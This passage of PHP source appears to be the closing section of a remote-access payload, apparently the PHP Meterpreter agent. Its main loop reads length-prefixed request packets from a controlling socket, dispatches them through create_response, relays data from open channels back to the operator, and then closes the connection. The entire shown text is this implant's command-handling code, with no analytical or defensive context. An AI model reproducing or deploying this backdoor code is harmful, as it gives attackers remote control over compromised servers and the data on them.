        register_stream($msgsock);
    }
}
add_reader($msgsock);

#
# Main dispatch loop
#
$r=$GLOBALS['readers'];
while (false !== ($cnt = select($r, $w=null, $e=null, 1))) {
    #my_print(sprintf("Returned from select with %s readers", count($r)));
    $read_failed = false;
    for ($i = 0; $i < $cnt; $i++) {
        $ready = $r[$i];
        if ($ready == $msgsock) {
            $request = read($msgsock, 8);
            #my_print(sprintf("Read returned %s bytes", strlen($request)));
            if (false==$request) {
                #my_print("Read failed on main socket, bailing");
                # We failed on the main socket.  There's no way to continue, so
                # break all the way out.
                break 2;
            }
            $a = unpack("Nlen/Ntype", $request);
            # length of the whole packet, including header
            $len = $a['len'];
            # packet type should always be 0, i.e. PACKET_TYPE_REQUEST
            $ptype = $a['type'];
            while (strlen($request) < $a['len']) {
                $request .= read($msgsock, $len-strlen($request));
            }
            #my_print("creating response");
            $response = create_response($request);

            write($msgsock, $response);
        } else {
            my_print("not Msgsock: $ready");
            $data = read($ready);
            my_print(sprintf("Read returned %s bytes", strlen($data)));
            if (false === $data || strlen($data) == 0) {
                $request = handle_dead_resource_channel($ready);
                write($msgsock, $request);
                remove_reader($ready);
            } else {
                $request = handle_resource_read_channel($ready, $data);
                my_print("Got some data from a channel that needs to be passed back to the msgsock");
                write($msgsock, $request);
            }
        }
    }
    $r = $GLOBALS['readers'];
} # end main loop
my_print("Finished");
close($msgsock);
